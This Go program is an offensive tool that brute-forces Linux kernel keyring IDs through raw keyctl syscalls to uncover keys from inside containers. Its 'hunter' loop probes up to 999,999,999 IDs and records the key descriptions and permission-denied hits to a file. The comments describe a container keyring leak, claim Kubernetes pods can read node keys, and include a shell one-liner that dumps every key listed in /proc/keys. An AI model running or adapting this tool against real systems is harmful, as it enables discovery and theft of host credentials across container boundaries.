package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"syscall"
	"unsafe"

	"github.com/cheggaaa/pb"
)

const (
	syscall_keyctl   uintptr = 250
	syscall_add_key  uintptr = 248
	syscall_setfsgid uintptr = 123
)

const (
	keyctlGetKeyringId keyctlCommand = iota
	keyctlJoinSessionKeyring
	keyctlUpdate
	keyctlRevoke
	keyctlChown
	keyctlSetPerm
	keyctlDescribe
	keyctlClear
	keyctlLink
	keyctlUnlink
	keyctlSearch
	keyctlRead
	keyctlInstantiate
	keyctlNegate
	keyctlSetReqKeyKeyring
	keyctlSetTimeout
	keyctlAssumeAuthority
)

const (
	keySpecThreadKeyring      keyId = -1
	keySpecProcessKeyring     keyId = -2
	keySpecSessionKeyring     keyId = -3
	keySpecUserKeyring        keyId = -4
	keySpecUserSessionKeyring keyId = -5
	keySpecGroupKeyring       keyId = -6
	keySpecReqKeyAuthKey      keyId = -7
)

var debugSyscalls bool

var count int

type keyId int32
type keyctlCommand int

func (cmd keyctlCommand) String() string {
	switch cmd {
	case keyctlGetKeyringId:
		return "keyctlGetKeyringId"
	case keyctlJoinSessionKeyring:
		return "keyctlJoinSessionKeyring"
	case keyctlUpdate:
		return "keyctlUpdate"
	case keyctlRevoke:
		return "keyctlRevoke"
	case keyctlChown:
		return "keyctlChown"
	case keyctlSetPerm:
		return "keyctlSetPerm"
	case keyctlDescribe:
		return "keyctlDescribe"
	case keyctlClear:
		return "keyctlClear"
	case keyctlLink:
		return "keyctlLink"
	case keyctlUnlink:
		return "keyctlUnlink"
	case keyctlSearch:
		return "keyctlSearch"
	case keyctlRead:
		return "keyctlRead"
	case keyctlInstantiate:
		return "keyctlInstantiate"
	case keyctlNegate:
		return "keyctlNegate"
	case keyctlSetReqKeyKeyring:
		return "keyctlSetReqKeyKeyring"
	case keyctlSetTimeout:
		return "keyctlSetTimeout"
	case keyctlAssumeAuthority:
		return "keyctlAssumeAuthority"
	}
	panic("bad arg")
}

func add_key(keyType, keyDesc string, payload []byte, id int32) (int32, error) {
	var (
		err    error
		errno  syscall.Errno
		b1, b2 *byte
		r1     uintptr
		pptr   unsafe.Pointer
	)

	if b1, err = syscall.BytePtrFromString(keyType); err != nil {
		return 0, err
	}

	if b2, err = syscall.BytePtrFromString(keyDesc); err != nil {
		return 0, err
	}

	if len(payload) > 0 {
		pptr = unsafe.Pointer(&payload[0])
	}
	r1, _, errno = syscall.Syscall6(syscall_add_key,
		uintptr(unsafe.Pointer(b1)),
		uintptr(unsafe.Pointer(b2)),
		uintptr(pptr),
		uintptr(len(payload)),
		uintptr(id),
		0)

	if errno != 0 {
		err = errno
		return 0, err
	}
	return int32(r1), nil
}

func listKeys(id keyId) ([]keyId, error) {
	var (
		b1             []byte
		size, sizeRead int
	)

	bsz := 4
	b1 = make([]byte, 16*bsz)
	size = len(b1)
	sizeRead = size + 1
	for sizeRead > size {
		r1, _, errno := syscall.Syscall6(syscall_keyctl, uintptr(keyctlRead), uintptr(id), uintptr(unsafe.Pointer(&b1[0])), uintptr(size), 0, 0)
		if errno != 0 {
			return nil, errno
		}

		if sizeRead = int(r1); sizeRead > size {
			b1 = make([]byte, sizeRead)
			size = sizeRead
			sizeRead++
		} else {
			size = sizeRead
		}
	}
	keys := make([]keyId, size/bsz)
	for i := range keys {
		keys[i] = *((*keyId)(unsafe.Pointer(&b1[i*bsz])))
	}

	return keys, nil
}

func describeKeyId(id keyId) ([]byte, error) {
	var (
		b1             []byte
		size, sizeRead int
	)

	b1 = make([]byte, 64)
	size = len(b1)
	sizeRead = size + 1
	for sizeRead > size {
		r1, _, errno := syscall.Syscall6(syscall_keyctl, uintptr(keyctlDescribe), uintptr(id), uintptr(unsafe.Pointer(&b1[0])), uintptr(size), 0, 0)
		if errno != 0 {
			return nil, errno
		}
		if sizeRead = int(r1); sizeRead > size {
			b1 = make([]byte, sizeRead)
			size = sizeRead
			sizeRead++
		} else {
			size = sizeRead
		}
	}

	return b1[:size-1], nil
}

func keyctl(cmd keyctlCommand, args ...uintptr) (r1 int32, r2 int32, err error) {
	a := make([]uintptr, 6)
	l := len(args)
	if l > 5 {
		l = 5
	}
	a[0] = uintptr(cmd)
	for idx, v := range args[:l] {
		a[idx+1] = v
	}

	debugSyscalls = true
	log.Printf("%v: %v %v\n", syscall_keyctl, cmd, a[1:])

	if debugSyscalls {
		log.Printf("%v: %v %v\n", syscall_keyctl, cmd, a[1:])
	}
	v1, v2, errno := syscall.Syscall6(syscall_keyctl, a[0], a[1], a[2], a[3], a[4], a[5])
	if errno != 0 {
		err = errno
		return
	}

	r1 = int32(v1)
	r2 = int32(v2)
	return
}

func hack_main() {
	// The poitn of this is Docker masks the /proc/keys so you can't
	// see the keys that are exposed to the user. But the mask doesn't prevent
	// you from accessing the keys themselves.
	//
	// example:
	// sudo keyctl show $((16#3eed9e15))
	// Should show the hex key id of the key if you have permission to it
	// often you don't have permission but that shouldn't be docker's job
	// Her'es an example:
	//
	// sudo cat /proc/keys | awk -F " " '{print $1}' | while read line ; do ; sudo keyctl print $((16#$line)) ; done
	//
	// read in all the actual content from /proc/keys and then try to print them...
	// this works if you're root.
	// but this shows permission denied because of course you don't have permissions to the keys ala that thing.
	// sudo cat /proc/keys | awk -F " " '{print $1}' | while read line ; do ; keyctl print $((16#$line)) ; done
	// so TL;DR all kubernetes pods can read node keys and there's nothing you can do
	// explained in more detail here: https://www.projectatomic.io/blog/2014/09/yet-another-reason-containers-don-t-contain-kernel-keyrings/

	// keyid, err := listKeys(keyId(-5))
	// fmt.Println(keyid, err)
	// breturn, err := describeKeyId(keyId(914466913))
	// fmt.Println(breturn, err)

	// var secret []byte

	// kid, err := add_key(
	// 	"user",
	// 	"description",
	// 	secret,
	// 	int32(999999999),
	// )
	// fmt.Println(kid, err)

}

//TODO add the link syscalls from the library here

var max int
var min int
var keyid int
var hunt bool = true
var output_path = "./keyctl_ids"

func init() {

	// Optional max count
	flag.IntVar(&max, "max", 999999999, "Max key id range")
	// OPtional min count
	flag.IntVar(&min, "min", 1, "Minimum key id range")
	// optional: specific key id
	flag.IntVar(&keyid, "key", 0, "Specific key ID to test (int32)")
	flag.BoolVar(&hunt, "hunt", true, "Enable brute force mode to search for key ids (Default enabled)")

}

func main() {
	flag.Parse()

	if keyid != 0 {
		fmt.Println(keyid)
		key_results, err := describeKeyId(keyId(keyid))
		if err == nil {
			fmt.Println(string(key_results))
		} else {
			fmt.Println(err.Error())
		}
	} else if hunt {
		hunter()
	}

	// keyring, err := keyctl.SessionKeyring()
	// key, err := keyring.Search("markskey")
	// markkey := int32(key.Id())
	// fmt.Println(markkey)

	// nkey, nerr := keyring.Search(string(markkey))
	// k := keyctl.Key{}
	// //k.Id = 123456789
	// fmt.Println(keyctl.SessionKeyring(123456789))
	// fuckyou, err := keyctl.Keyring()
	// fmt.Println(fuckyou)

	// ref := keyctl.Reference{}
	// ref.Id = 123456789
	// fmt.Println(ref.Valid())
	// fmt.Println(ref.Info())
	// fmt.Println("I just printed ref")

	// realref := 682466440
	// rref := keyctl.Reference{}
	// rref.Id = int32(realref)
	// fmt.Println(rref.Info())
	// fmt.Println(rref.Valid())

	// myref, err := ref.Get(ref.Id)
	// fmt.Println(err)
	// fmt.Println(myref)

	//ref := keyctl.Reference{}

	//fmt.Println(int32(nkey.Id()))

	// if err != nil {
	// 	log.Fatal(err)
	// }

	// fmt.Println(key)

	// var testkey = 682466440
	// var min = testkey - 5
	// var max = testkey + 5

	//var min = 0
	//var max = 999999999
}

type Key struct {
	KeyId          int32
	Name           string
	String_Content string
	Byte_Content   []byte
	Comments       string
}

func hunter() {
	bar := pb.StartNew(count)
	// bar := pb.StartNew(max)

	f, _ := os.Create(output_path)
	defer f.Close()
	//f.WriteString("Starting test...\n")

	//for i := 0; i < count; i++ {
	for i := min; i < max; i++ {
		bar.Increment()

		breturn, err := describeKeyId(keyId(i))
		if err != nil {
			k := Key{}
			k.KeyId = int32(i)
			fmt.Println(string(breturn))
			// TODO process results of breturn

			if msg := err.Error(); msg == "permission denied" {
				//fmt.Println("Found a key but denied:", i)
				fmt.Printf("X")
				//TODO if permission denied, try to find session and link

				output := fmt.Sprintf("%d\n", i)
				f.WriteString(output)
				//TODO update k()
			} else if msg := err.Error(); msg == "required key not available" {
				//fmt.Println("no key found here:", i)
			} else {
				fmt.Println("%d: %s", i, err.Error())
				//TODO check for weird errors

			}
		} else {
			output := fmt.Sprintf("%d : %s \n", i, string(breturn))
			io.WriteString(f, output)
			// TODO explain output
		}
		//TODO output json to file

	}
	bar.Finish()
}
